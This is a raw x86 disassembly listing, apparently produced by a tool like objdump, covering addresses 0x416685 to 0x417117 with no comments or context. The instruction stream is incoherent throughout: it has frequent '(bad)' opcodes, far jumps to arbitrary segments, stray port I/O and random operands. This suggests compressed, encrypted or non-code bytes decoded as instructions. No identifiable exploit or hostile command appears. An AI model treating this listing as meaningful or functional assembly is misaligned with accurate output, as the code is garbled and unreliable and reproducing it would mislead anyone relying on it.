  416685:	les    ebp,FWORD PTR [esi-0x7a8cadb]
  41668b:	inc    ecx
  41668c:	icebp  
  41668d:	inc    eax
  41668e:	mov    esp,0xdd243d53
  416693:	mul    BYTE PTR [edx+0x2200d5bc]
  416699:	lock or esi,DWORD PTR fs:[ebx]
  41669d:	jb     0x4166d8
  41669f:	push   cs
  4166a0:	sub    eax,0x24a18478
  4166a5:	and    bh,BYTE PTR [eax]
  4166a7:	or     BYTE PTR [edi+0x65762734],0x29
  4166ae:	jmp    FWORD PTR [edx]
  4166b0:	fsubrp st(4),st
  4166b2:	mov    ds:0xeda1c66a,eax
  4166b7:	add    eax,0x487f7ec6
  4166bc:	fldenv [edx+0x17]
  4166bf:	add    al,0x3b
  4166c1:	pop    ebx
  4166c2:	mov    al,0x86
  4166c4:	rcl    BYTE PTR [edi+0x44a71a98],1
  4166ca:	fs and eax,0x827f19e1
  4166d0:	mov    ch,0xe8
  4166d2:	jecxz  0x4166a2
  4166d4:	ss pop ebp
  4166d6:	push   edx
  4166d7:	push   es
  4166d8:	sub    eax,0xd1a8ca51
  4166dd:	ja     0x416727
  4166df:	jl     0x416693
  4166e1:	push   0xffffffb0
  4166e3:	mov    ds:0x43a4004d,eax
  4166e8:	push   ds
  4166e9:	das    
  4166ea:	or     edi,edx
  4166ec:	repnz and cl,BYTE PTR [ebp-0x2b8109f0]
  4166f3:	mov    edi,0xf7d96e34
  4166f8:	inc    ebx
  4166f9:	loope  0x4166da
  4166fb:	mov    esp,0x559db414
  416700:	cmp    ecx,edi
  416702:	mov    dh,0x95
  416704:	dec    edi
  416705:	sbb    ah,BYTE PTR [esi]
  416707:	pop    esp
  416708:	das    
  416709:	inc    esp
  41670a:	fmul   st,st(4)
  41670c:	(bad)  
  41670d:	shl    BYTE PTR [eax-0x37],cl
  416710:	jb     0x41669f
  416712:	inc    eax
  416713:	cld    
  416714:	rol    DWORD PTR [eax],0xf7
  416717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416718:	jmp    0xdaa1:0xc41af951
  41671f:	imul   eax,DWORD PTR [edx],0x25b9b3a0
  416725:	dec    ecx
  416726:	fcomi  st,st(0)
  416728:	sub    al,0x90
  41672a:	xor    al,0x90
  41672c:	xlat   BYTE PTR ds:[ebx]
  41672d:	popa   
  41672e:	fnstcw WORD PTR [ebx]
  416730:	push   ss
  416731:	and    BYTE PTR [eax],al
  416733:	stos   DWORD PTR es:[edi],eax
  416734:	xlat   BYTE PTR ds:[ebx]
  416735:	icebp  
  416736:	addr16 xchg ah,dh
  416739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41673a:	ret    
  41673b:	mov    ?,esp
  41673d:	popf   
  41673e:	stos   BYTE PTR es:[edi],al
  41673f:	xchg   ebp,eax
  416740:	cmc    
	...
  4167b1:	add    BYTE PTR [eax],al
  4167b3:	add    bl,cl
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm4,xmm6
  4167c1:	inc    ecx
  4167c2:	inc    ebp
  4167c3:	pop    es
  4167c4:	shl    ebp,1
  4167c6:	add    BYTE PTR [eax],al
  4167c8:	cmc    
  4167c9:	add    BYTE PTR [eax],al
  4167cb:	add    BYTE PTR [ecx-0x51],dh
  4167ce:	out    dx,al
  4167cf:	jmp    0xf3f2:0x3d8809f4
  4167d6:	rcl    eax,1
  4167d8:	imul   eax,eax,0x45b66567
  4167de:	adc    bl,BYTE PTR [ebx-0x6398df1d]
  4167e4:	jle    0x416782
  4167e6:	popf   
  4167e7:	pop    edx
  4167e8:	stc    
  4167e9:	mov    esi,0xe85669af
  4167ee:	pop    esp
  4167ef:	push   esp
  4167f0:	rol    DWORD PTR [ebp-0x5a],1
  4167f3:	dec    edi
  4167f4:	ja     0x41683f
  4167f6:	push   edx
  4167f7:	xor    bh,BYTE PTR [edx-0x47]
  4167fa:	shr    DWORD PTR [edi],1
  4167fc:	xchg   BYTE PTR [edx],cl
  4167fe:	mov    WORD PTR [edi-0x6],ds
  416801:	pop    ebp
  416802:	es dec esi
  416804:	(bad)  
  416805:	pop    esi
  416806:	es icebp 
  416808:	stos   DWORD PTR es:[edi],eax
  416809:	(bad)  
  41680a:	mov    dh,0x91
  41680c:	xchg   ebp,eax
  41680d:	jge    0x4167ef
  41680f:	inc    edi
  416810:	xchg   ebp,eax
  416811:	jns    0x41684e
  416813:	jg     0x4167d5
  416815:	jbe    0x416831
  416817:	lods   eax,DWORD PTR ds:[esi]
  416818:	imul   eax,DWORD PTR [eax],0x4e
  41681b:	or     al,0xc2
  41681d:	xor    ebx,eax
  41681f:	or     BYTE PTR [edi],al
  416821:	mov    eax,0xd3b2417d
  416826:	pop    edi
  416827:	mov    edi,0x6af2f779
  41682c:	push   ebp
  41682d:	int    0x44
  41682f:	jns    0x41687a
  416831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416832:	addr16 push 0xcf6a6756
  416838:	mov    ebp,0x49362e66
  41683d:	push   0xffffffe9
  41683f:	fild   QWORD PTR [ebx-0x5f]
  416842:	sub    ebx,DWORD PTR [eax+0x5b6c1cb9]
  416848:	lock dec eax
  41684a:	scas   al,BYTE PTR es:[edi]
  41684b:	ja     0x416851
  41684d:	fdiv   st,st(5)
  41684f:	mov    al,ds:0x98a8f359
  416854:	pop    es
  416855:	cmc    
  416856:	rcl    BYTE PTR [edi+edi*4+0xc],cl
  41685a:	push   esp
  41685b:	ror    ebp,0xf7
  41685e:	rcl    BYTE PTR ds:0xcfb0d417,1
  416864:	pop    esi
  416865:	sbb    eax,0xac65bec1
  41686a:	clc    
  41686b:	mov    gs,WORD PTR [ebp-0x23]
  41686e:	xchg   edx,eax
  41686f:	fisttp WORD PTR [ebx-0x6f]
  416872:	xchg   edx,eax
  416873:	pushf  
  416874:	jbe    0x41682a
  416876:	dec    ebx
  416877:	popa   
  416878:	arpl   WORD PTR [ebx+0x5a],di
  41687b:	repnz sub BYTE PTR [edi-0x1d8df0c6],cl
  416882:	repnz push ds
  416884:	xor    eax,0xf2766a28
  416889:	pushf  
  41688a:	das    
  41688b:	enter  0xcc6c,0xc
  41688f:	mov    edi,0x862f684a
  416894:	js     0x4168fb
  416896:	mov    al,0x43
  416898:	test   al,0xd0
  41689a:	clc    
  41689b:	jno    0x4168ca
  41689d:	xor    ebp,DWORD PTR [ecx-0x52c769ea]
  4168a3:	jno    0x4168fa
  4168a5:	int3   
  4168a6:	adc    eax,0x5f8d7e14
  4168ab:	add    DWORD PTR [ebx+0x5d],ebx
  4168ae:	popf   
  4168af:	pop    esi
  4168b0:	shl    BYTE PTR [ebx+0x6e],0xe0
  4168b4:	jecxz  0x4168ed
  4168b6:	jae    0x41691e
  4168b8:	cmp    eax,0x372fc4ae
  4168bd:	dec    ecx
  4168be:	icebp  
  4168bf:	sub    DWORD PTR [eax+eax*1],ebp
	...
  416932:	add    BYTE PTR [eax],al
  416934:	inc    ebp
  416935:	mov    BYTE PTR [edi+esi*2],ch
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [edx+0x55],eax
  416942:	sub    BYTE PTR ds:0xf6c6,dh
  416948:	cmc    
  416949:	add    BYTE PTR [eax],al
  41694b:	add    cl,cl
  41694d:	in     al,dx
  41694e:	sahf   
  41694f:	call   0x5ec5:0xa71579c6
  416956:	xor    dl,BYTE PTR [ebx]
  416958:	mov    ds:0x4fd5afe9,eax
  41695d:	es xchg ebp,eax
  41695f:	dec    eax
  416960:	lock add al,0x63
  416963:	or     esp,DWORD PTR [edx]
  416965:	or     al,0x1
  416967:	sbb    al,0x5a
  416969:	mov    ds:0x6d9ded75,eax
  41696e:	call   0x6ab6:0x4f85bfc
  416975:	(bad)
  416978:	dec    edx
  416979:	sub    cl,BYTE PTR [ecx+0xc]
  41697c:	push   cs
  41697d:	pop    esp
  41697e:	ds (bad) 
  416980:	push   esi
  416981:	(bad)  
  416982:	iret   
  416983:	add    esp,DWORD PTR [esi+0x68]
  416986:	inc    ecx
  416987:	scas   al,BYTE PTR es:[edi]
  416988:	sub    BYTE PTR [edx],dl
  41698a:	mov    ch,0xdf
  41698c:	repnz inc ecx
  41698e:	xor    DWORD PTR [edi],edi
  416990:	(bad)  
  416991:	clc    
  416992:	add    BYTE PTR [esi+0x37c084f6],cl
  416998:	stc    
  416999:	dec    ecx
  41699a:	fcomip st,st(2)
  41699c:	ins    BYTE PTR es:[edi],dx
  41699d:	std    
  41699e:	pop    esp
  41699f:	inc    ecx
  4169a0:	inc    eax
  4169a1:	sub    al,0xdd
  4169a3:	fadd   QWORD PTR [edx]
  4169a5:	xchg   ebx,eax
  4169a6:	xchg   edx,eax
  4169a7:	ins    DWORD PTR es:[edi],dx
  4169a8:	cs mov dl,bl
  4169ab:	cdq    
  4169ac:	and    al,0x64
  4169ae:	in     eax,0x43
  4169b0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4169b2:	pusha  
  4169b3:	fs sti 
  4169b5:	xlat   BYTE PTR ds:[ebx]
  4169b6:	into   
  4169b7:	pop    ecx
  4169b8:	or     dl,BYTE PTR [edx+0x67]
  4169bb:	pop    es
  4169bc:	aad    0x48
  4169be:	loop   0x4169df
  4169c0:	dec    edx
  4169c1:	mov    ecx,esi
  4169c3:	fadd   DWORD PTR [ebx-0x3b]
  4169c6:	mov    esi,0x3512aabf
  4169cb:	adc    DWORD PTR [ecx],ecx
  4169cd:	mov    esi,0x6bd36b9e
  4169d2:	push   edx
  4169d3:	push   DWORD PTR es:[ebp-0x334ff898]
  4169da:	js     0x4169e5
  4169dc:	das    
  4169dd:	jnp    0x416a20
  4169df:	add    esp,ecx
  4169e1:	test   dl,bh
  4169e3:	fiadd  WORD PTR [eax-0xd521170]
  4169e9:	push   edx
  4169ea:	and    eax,0xd2f3c0cd
  4169ef:	dec    edi
  4169f0:	neg    BYTE PTR [ecx-0x72]
  4169f3:	int3   
  4169f4:	loop   0x416a68
  4169f6:	(bad)
  4169fa:	adc    eax,0xa0220c07
  4169ff:	stos   BYTE PTR es:[edi],al
  416a00:	jp     0x416a7a
  416a02:	jae    0x416a60
  416a04:	mov    esi,0x70da8a75
  416a09:	push   0x6640deb0
  416a0e:	push   ebp
  416a0f:	jle    0x4169fe
  416a11:	mov    cl,0x6f
  416a13:	adc    eax,0x681adf53
  416a18:	retf   
  416a19:	sub    BYTE PTR [eax+0x56],al
  416a1c:	xchg   ebx,eax
  416a1d:	jle    0x416a73
  416a1f:	mov    bl,0xd6
  416a21:	or     esp,esp
  416a23:	int    0x64
  416a25:	stos   BYTE PTR es:[edi],al
  416a26:	sar    BYTE PTR [edi+0x76df95ec],0xc0
  416a2d:	pop    ebx
  416a2e:	addr16 add ch,dl
  416a31:	add    eax,0xc58e1f6c
  416a36:	dec    esp
  416a37:	dec    edi
  416a38:	shl    DWORD PTR [esi],cl
  416a3a:	mov    al,0xbc
  416a3c:	out    dx,al
  416a3d:	in     eax,dx
  416a3e:	add    ah,0x97
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x51eb7b52]
  416ac3:	mov    al,0xbb
  416ac5:	test   DWORD PTR [eax],0xf500
  416acb:	add    BYTE PTR [eax+edi*8+0x50f4f563],ch
  416ad2:	int    0x80
  416ad4:	in     eax,0x5c
  416ad6:	mov    ebx,DWORD PTR [edi+0x29818557]
  416adc:	stos   DWORD PTR es:[edi],eax
  416add:	mov    ds:0xdcab86a8,eax
  416ae2:	adc    BYTE PTR [ebx+0x597d6d01],ah
  416ae8:	sbb    dh,BYTE PTR [eax]
  416aea:	and    bh,0x2a
  416aed:	stos   BYTE PTR es:[edi],al
  416aee:	jb     0x416b2b
  416af0:	ins    DWORD PTR es:[edi],dx
  416af1:	stc    
  416af2:	cdq    
  416af3:	test   BYTE PTR [edi+0xa],dh
  416af6:	mov    ds:0x84d3ad9d,eax
  416afb:	inc    edi
  416afc:	mov    dh,0x3b
  416afe:	xchg   edx,eax
  416aff:	xchg   edx,eax
  416b00:	mov    eax,0xfe101963
  416b05:	out    dx,al
  416b06:	jp     0x416b13
  416b08:	mov    edi,0xf34affdc
  416b0d:	xchg   ebp,esi
  416b0f:	outs   dx,BYTE PTR ds:[esi]
  416b10:	cmp    BYTE PTR [esi+esi*8-0x532b0dbf],dh
  416b17:	xchg   ebx,eax
  416b18:	scas   al,BYTE PTR es:[edi]
  416b19:	xchg   esi,eax
  416b1a:	pop    ebx
  416b1b:	dec    ebp
  416b1c:	ret    
  416b1d:	loopne 0x416adf
  416b1f:	sbb    bl,BYTE PTR [ebp+ecx*2-0xc]
  416b23:	shr    DWORD PTR [ecx-0x556910c0],1
  416b29:	inc    esi
  416b2a:	repnz sub DWORD PTR [ecx-0x5d741b94],edi
  416b31:	mov    bh,0x30
  416b33:	mov    BYTE PTR [eax],ch
  416b35:	(bad)  
  416b36:	ds test al,0x3c
  416b39:	(bad)  
  416b3a:	push   ecx
  416b3b:	xchg   esp,eax
  416b3c:	pop    es
  416b3d:	push   edx
  416b3e:	aad    0xed
  416b40:	jge    0x416ac5
  416b42:	mov    al,0x34
  416b44:	arpl   WORD PTR [eax+0x4c],si
  416b47:	scas   al,BYTE PTR es:[edi]
  416b48:	idiv   BYTE PTR [ebx]
  416b4a:	mov    DWORD PTR [edi],edi
  416b4c:	add    eax,0x6821c2d0
  416b51:	sbb    esp,esp
  416b53:	rol    DWORD PTR [ebx-0x70],cl
  416b56:	mov    edx,0xca7a8b5a
  416b5b:	gs xchg esp,eax
  416b5d:	push   ecx
  416b5e:	stos   DWORD PTR es:[edi],eax
  416b5f:	inc    edx
  416b60:	and    DWORD PTR [ebp+0x56cc781a],esi
  416b66:	mov    ah,0xc9
  416b68:	sbb    DWORD PTR [eax+0x65066889],ebp
  416b6e:	jne    0x416b36
  416b70:	cmp    BYTE PTR [edx+edx*2],ch
  416b73:	shr    DWORD PTR [ebx-0x1b0d13a1],cl
  416b79:	into   
  416b7a:	inc    eax
  416b7b:	dec    ebx
  416b7c:	push   0x1e
  416b7e:	rcl    BYTE PTR [ebx+0x4],0x4d
  416b82:	sbb    eax,0xf885e575
  416b87:	jecxz  0x416b4f
  416b89:	mov    ebx,0x23a066de
  416b8e:	sub    BYTE PTR [edi-0x3892525b],bl
  416b94:	dec    esp
  416b95:	sub    al,0x19
  416b97:	mov    ebx,0xa4749f19
  416b9c:	mov    ds:0xc266c14a,al
  416ba1:	fsubr  QWORD PTR [edi-0x1f]
  416ba4:	dec    ecx
  416ba5:	stos   BYTE PTR es:[edi],al
  416ba6:	pop    ds
  416ba7:	pusha  
  416ba8:	jns    0x416c1c
  416baa:	(bad)
  416bae:	jecxz  0x416c2c
  416bb0:	inc    eax
  416bb1:	cs (bad) 
  416bb3:	lods   eax,DWORD PTR ds:[esi]
  416bb4:	(bad)  
  416bb5:	cmp    DWORD PTR [esi],ebp
  416bb7:	jo     0x416b4a
  416bb9:	ficom  DWORD PTR [ebx-0x7f5b799b]
  416bbf:	in     eax,dx
  416bc0:	and    al,0x0
	...
  416c32:	add    BYTE PTR [eax],al
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    edi,DWORD PTR [eax+0x3f]
  416c42:	(bad)  
  416c43:	hlt    
  416c44:	mov    al,0xf8
  416c46:	add    BYTE PTR [eax],al
  416c48:	cmc    
  416c49:	add    BYTE PTR [eax],al
  416c4b:	add    al,cl
  416c4d:	cmp    cl,BYTE PTR [ecx-0x261dbfeb]
  416c53:	inc    ebx
  416c54:	xchg   esi,eax
  416c55:	and    DWORD PTR [eax+0x68cbf2c1],ebp
  416c5b:	push   edi
  416c5c:	cmp    BYTE PTR [esi],0xe
  416c5f:	aaa    
  416c60:	fadd   DWORD PTR [eax-0x72c3999e]
  416c66:	std    
  416c67:	push   cs
  416c68:	cmp    eax,esi
  416c6a:	lahf   
  416c6b:	cmc    
  416c6c:	sub    eax,0x6b83360d
  416c71:	imul   esi,ecx,0xffffff95
  416c74:	pop    ebx
  416c75:	mov    esp,0x5acc1910
  416c7a:	cmp    eax,0xb037f717
  416c7f:	mov    ebp,0x8f5adc7
  416c84:	lock cmc 
  416c86:	stos   DWORD PTR es:[edi],eax
  416c87:	cmp    esp,DWORD PTR [esi+0x52]
  416c8a:	mov    esi,0x4af19507
  416c8f:	loope  0x416d08
  416c91:	loop   0x416c74
  416c93:	pop    ebx
  416c94:	add    bh,bh
  416c96:	in     al,0x13
  416c98:	jp     0x416c59
  416c9a:	pop    ebp
  416c9b:	add    dl,dh
  416c9d:	jb     0x416d13
  416c9f:	fs cld 
  416ca1:	lods   al,BYTE PTR ds:[esi]
  416ca2:	rcl    DWORD PTR [ebp+0x5a64323c],1
  416ca8:	jno    0x416d1c
  416caa:	pop    esp
  416cab:	daa    
  416cac:	out    dx,al
  416cad:	jo     0x416cab
  416caf:	inc    esp
  416cb0:	xor    BYTE PTR [ebp-0x4b],dl
  416cb3:	test   DWORD PTR [ecx-0x59d5a426],esi
  416cb9:	or     DWORD PTR [ebx+0x43ab90dc],edi
  416cbf:	add    eax,0xcaf3206d
  416cc4:	loope  0x416c94
  416cc6:	pop    esi
  416cc7:	pusha  
  416cc8:	ins    BYTE PTR es:[edi],dx
  416cc9:	outs   dx,DWORD PTR cs:[esi]
  416ccb:	inc    esp
  416ccc:	bound  esp,QWORD PTR [ebx+0x9]
  416ccf:	je     0x416c77
  416cd1:	pop    ds
  416cd2:	inc    ebx
  416cd3:	mov    cl,0x5d
  416cd5:	and    eax,0x8a2b67da
  416cda:	mov    ecx,0xf83f7aa9
  416cdf:	push   cs
  416ce0:	repnz clc 
  416ce2:	(bad)  
  416ce4:	xchg   ecx,eax
  416ce5:	push   esp
  416ce6:	push   eax
  416ce7:	pop    edi
  416ce8:	mov    dl,BYTE PTR [ecx-0x25338b02]
  416cee:	popf   
  416cef:	je     0x416d27
  416cf1:	aas    
  416cf2:	aam    0xf5
  416cf4:	jge    0x416ca2
  416cf6:	push   ss
  416cf7:	popa   
  416cf8:	test   ecx,eax
  416cfa:	iret   
  416cfb:	(bad)  
  416cfc:	fcom   QWORD PTR [ebp+0x6d2396c4]
  416d02:	adc    ebx,eax
  416d04:	pushf  
  416d05:	jmp    0x416d60
  416d07:	(bad)  [eax+edi*1-0x2fb08eb7]
  416d0e:	push   eax
  416d0f:	xchg   ecx,eax
  416d10:	cwde   
  416d11:	test   ebx,esi
  416d13:	pop    ss
  416d14:	mov    ds:0xb077f20d,eax
  416d19:	das    
  416d1a:	add    esi,DWORD PTR [eax-0x24]
  416d1d:	xchg   edx,eax
  416d1e:	and    edx,ecx
  416d20:	imul   ebx,ebx,0x861da9b4
  416d26:	das    
  416d27:	sbb    ebx,DWORD PTR [esi+0x3c]
  416d2a:	push   0xcecdfcd
  416d2f:	jbe    0x416d53
  416d31:	fidiv  DWORD PTR ss:[ebx]
  416d34:	ror    BYTE PTR [edx+0x5e77f725],cl
  416d3a:	xchg   edi,eax
  416d3b:	cdq    
  416d3c:	jle    0x416d05
  416d3e:	xor    DWORD PTR [edi-0x64],esp
	...
  416db1:	add    BYTE PTR [eax],al
  416db3:	add    dh,ch
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0xa607b91c
  416dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc5:	stc    
  416dc6:	add    BYTE PTR [eax],al
  416dc8:	cmc    
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    dh,ah
  416dcd:	xchg   esp,eax
  416dce:	in     eax,0xfd
  416dd0:	rcr    DWORD PTR [ebx-0x258c8fa1],cl
  416dd6:	or     DWORD PTR [ecx+eax*1],esp
  416dd9:	mov    cl,0x69
  416ddb:	xchg   edx,eax
  416ddc:	es hlt 
  416dde:	fmul   DWORD PTR [esi]
  416de0:	mov    ch,0xc0
  416de2:	xor    al,0x4b
  416de4:	outs   dx,DWORD PTR ds:[esi]
  416de5:	sbb    dl,bh
  416de7:	lods   eax,DWORD PTR ds:[esi]
  416de8:	shr    bh,0xd5
  416deb:	ins    DWORD PTR es:[edi],dx
  416dec:	repz retf 
  416dee:	scas   al,BYTE PTR es:[edi]
  416def:	fs nop
  416df1:	repz dec ecx
  416df3:	inc    esi
  416df4:	test   BYTE PTR [edi-0x62e6c521],0x57
  416dfb:	repnz adc eax,DWORD PTR [ebx+0x69]
  416dff:	jnp    0x416e7f
  416e01:	jno    0x416de2
  416e03:	enter  0xdd7d,0x49
  416e07:	jmp    0x3924:0xef02244c
  416e0e:	pop    ss
  416e0f:	cwde   
  416e10:	inc    esi
  416e11:	cmp    bh,bl
  416e13:	aaa    
  416e14:	jl     0x416e69
  416e16:	(bad)  
  416e17:	mov    esi,0x6f628ee2
  416e1c:	cmp    al,bl
  416e1e:	push   es
  416e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e20:	mov    al,0x9f
  416e22:	daa    
  416e23:	(bad)  
  416e25:	xchg   ecx,eax
  416e26:	mov    ds:0xfb328e68,eax
  416e2b:	loop   0x416e2b
  416e2d:	or     al,0xd6
  416e2f:	xor    eax,0x28b5a640
  416e34:	in     eax,dx
  416e35:	gs jno 0x416e80
  416e38:	add    ebp,DWORD PTR [ecx+0x49]
  416e3b:	iret   
  416e3c:	jne    0x416ebc
  416e3e:	jmp    0xd79f2fd9
  416e43:	je     0x416e92
  416e45:	ja     0x416e8e
  416e47:	add    ch,BYTE PTR [esi+0x58dae0b2]
  416e4d:	cmp    BYTE PTR [ecx+0x74],bh
  416e50:	pop    esi
  416e51:	xchg   ebx,eax
  416e52:	in     al,0x97
  416e54:	xor    BYTE PTR [ecx],dh
  416e56:	add    al,0xce
  416e58:	je     0x416e29
  416e5a:	and    al,0xaa
  416e5c:	sar    DWORD PTR [ebp+0xa15eb4d],cl
  416e62:	jp     0x416ed5
  416e64:	xor    bh,BYTE PTR [eax]
  416e66:	pop    ebp
  416e67:	out    dx,al
  416e68:	out    0x4a,al
  416e6a:	mov    ds:0x6f9fe56d,eax
  416e6f:	rcl    DWORD PTR [edx+0x59],0x3c
  416e73:	in     al,dx
  416e74:	cwde   
  416e75:	mov    dh,0xb6
  416e77:	adc    BYTE PTR [edi-0x7c68db74],ch
  416e7d:	ja     0x416ebb
  416e7f:	ins    BYTE PTR es:[edi],dx
  416e80:	sub    DWORD PTR [ecx],ecx
  416e82:	mov    ebx,0x7f122745
  416e87:	ds aad 0x58
  416e8a:	or     ebp,DWORD PTR [edi+0x68]
  416e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e8e:	fdivr  DWORD PTR [edi-0x6d9e3d78]
  416e94:	jg     0x416ea6
  416e96:	fcom   QWORD PTR gs:[ecx+0x98c905c]
  416e9d:	ja     0x416eed
  416e9f:	outs   dx,DWORD PTR ds:[esi]
  416ea0:	and    eax,0x3a01ea44
  416ea5:	sti    
  416ea6:	sub    eax,0xdd831f9f
  416eab:	std    
  416eac:	test   BYTE PTR [ebx],ch
  416eae:	(bad)  
  416eb0:	cmp    esi,ebp
  416eb2:	dec    edi
  416eb3:	hlt    
  416eb4:	test   al,0xe6
  416eb6:	jnp    0x416e51
  416eb8:	mov    eax,ds:0x5aa5bca
  416ebd:	adc    al,0x1d
  416ebf:	mov    eax,ds:0x90
	...
  416f34:	pop    ss
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	mov    bh,0x64
  416f42:	(bad)  
  416f43:	cmp    DWORD PTR [edx-0xaffff06],ebx
  416f49:	add    BYTE PTR [eax],al
  416f4b:	add    dh,bh
  416f4d:	dec    esp
  416f4e:	cs sub eax,0xdb7bb486
  416f54:	jo     0x416f6b
  416f56:	push   es
  416f57:	sahf   
  416f58:	adc    BYTE PTR [ecx+0x7388b305],dl
  416f5e:	dec    esi
  416f5f:	fadd   QWORD PTR [ecx]
  416f61:	je     0x416f29
  416f63:	jmp    0xdd0aabe7
  416f68:	mov    al,0x51
  416f6a:	(bad)  
  416f6c:	inc    edx
  416f6d:	and    ecx,DWORD PTR [edx+0x3d]
  416f70:	xlat   BYTE PTR ds:[ebx]
  416f71:	sbb    al,0x89
  416f73:	xlat   BYTE PTR ds:[ebx]
  416f74:	adc    ebp,ebp
  416f76:	outs   dx,BYTE PTR ds:[esi]
  416f77:	sbb    DWORD PTR [ecx-0x51],edx
  416f7a:	adc    DWORD PTR [ebx],edi
  416f7c:	or     eax,0xffffffdc
  416f7f:	push   ebx
  416f80:	inc    edi
  416f81:	push   0xffffff8a
  416f83:	outs   dx,WORD PTR ds:[esi]
  416f85:	retf   
  416f86:	aaa    
  416f87:	jbe    0x416fb2
  416f89:	push   edx
  416f8a:	and    ah,0x7
  416f8d:	fild   WORD PTR [esi-0x68]
  416f90:	adc    ah,BYTE PTR [ebx]
  416f92:	frstor [ebp-0x232610c9]
  416f98:	cs enter 0x34e1,0x44
  416f9d:	fcmovnu st,st(3)
  416f9f:	and    ch,BYTE PTR ds:0x8ddb2a10
  416fa5:	hlt    
  416fa6:	mov    DWORD PTR [edx-0x5a230d7e],edi
  416fac:	fs jnp 0x416f45
  416faf:	cld    
  416fb0:	sar    BYTE PTR [ebp+0x34],1
  416fb3:	xchg   ebp,eax
  416fb4:	aam    0xfe
  416fb6:	shl    DWORD PTR [edi],0x7c
  416fb9:	dec    edi
  416fba:	fsubr  QWORD PTR ds:0xe217e462
  416fc0:	xchg   ecx,eax
  416fc1:	dec    edi
  416fc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fc3:	add    edi,DWORD PTR [ecx-0x65]
  416fc6:	aam    0x9c
  416fc8:	aaa    
  416fc9:	(bad)  
  416fcb:	repnz sbb eax,0xaf43acb3
  416fd1:	adc    al,0xce
  416fd3:	inc    eax
  416fd4:	add    ecx,DWORD PTR [edx-0x415b3f16]
  416fda:	stc    
  416fdb:	stos   BYTE PTR es:[edi],al
  416fdc:	dec    eax
  416fdd:	add    DWORD PTR [ebp-0x455f098],0xffffff8e
  416fe4:	push   esi
  416fe5:	and    DWORD PTR [ecx-0x67],0xffffffd1
  416fe9:	leave  
  416fea:	iret   
  416feb:	pop    ds
  416fec:	adc    BYTE PTR [ebp-0x3c1b4008],0x20
  416ff3:	scas   eax,DWORD PTR es:[edi]
  416ff4:	cmp    al,0x95
  416ff6:	inc    esp
  416ff7:	adc    ebp,DWORD PTR [edx+0x34]
  416ffa:	jle    0x416fc6
  416ffc:	dec    ebp
  416ffd:	dec    ecx
  416ffe:	ja     0x417008
  417000:	mov    eax,0xcd7e2328
  417005:	add    DWORD PTR [ecx-0x72],eax
  417008:	dec    ecx
  417009:	xchg   DWORD PTR [eax-0x58],esi
  41700c:	daa    
  41700d:	cmp    eax,0x178dc501
  417012:	jnp    0x417045
  417014:	idiv   ecx
  417016:	fwait
  417017:	and    edx,DWORD PTR [esi+0x412fb986]
  41701d:	push   ebp
  41701e:	adc    eax,0xb2a92ff3
  417023:	xchg   esp,eax
  417024:	ja     0x417061
  417026:	fldcw  WORD PTR [ebx]
  417028:	push   edi
  417029:	sub    ebp,esi
  41702b:	xchg   ebp,eax
  41702c:	pop    ds
  41702d:	xchg   esp,eax
  41702e:	adc    eax,0x75ecea66
  417033:	js     0x41700b
  417035:	aaa    
  417036:	mov    bh,0x99
  417038:	imul   esp,ebp,0x2a
  41703b:	dec    ebx
  41703c:	push   ss
  41703d:	mov    ss,WORD PTR [esi-0x51]
  417040:	cmc    
	...
  4170b1:	add    BYTE PTR [eax],al
  4170b3:	add    BYTE PTR [eax],ah
  4170b5:	jmp    0xdf3d4ef5
  4170ba:	in     eax,0xff
  4170bc:	dec    ecx
  4170bd:	dec    ecx
  4170be:	ret    
  4170bf:	add    ebp,0x5d
  4170c2:	mov    cl,0xe1
  4170c4:	(bad)  
  4170c5:	sti    
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	cmc    
  4170c9:	add    BYTE PTR [eax],al
  4170cb:	add    BYTE PTR [edi],cl
  4170cd:	sbb    dh,BYTE PTR [esp+eiz*8-0x6b]
  4170d1:	pop    edi
  4170d2:	ficomp WORD PTR [ebp+0x1494444e]
  4170d8:	push   cs
  4170d9:	xchg   ecx,eax
  4170da:	mov    bl,0xd6
  4170dc:	sbb    eax,0xe9750f75
  4170e1:	pop    edi
  4170e2:	sbb    cl,BYTE PTR [eax-0x6a5bf1c6]
  4170e8:	and    al,dh
  4170ea:	dec    eax
  4170eb:	push   ds
  4170ec:	ficomp WORD PTR [ebx-0x7055ddcf]
  4170f2:	cli    
  4170f3:	cld    
  4170f4:	loopne 0x417105
  4170f6:	jge    0x417163
  4170f8:	or     ch,al
  4170fa:	push   ds
  4170fb:	jecxz  0x41716d
  4170fd:	outs   dx,DWORD PTR ds:[esi]
  4170fe:	in     eax,dx
  4170ff:	mov    bl,0x24
  417101:	mov    ds:0xb820fd33,eax
  417106:	pop    esp
  417107:	add    eax,0xcb6c18e9
  41710c:	ja     0x41711b
  41710e:	and    BYTE PTR [ebp+eax*2+0x5bb61e6c],bh
  417115:	fidivr WORD PTR [edx]
  417117:	push   ecx
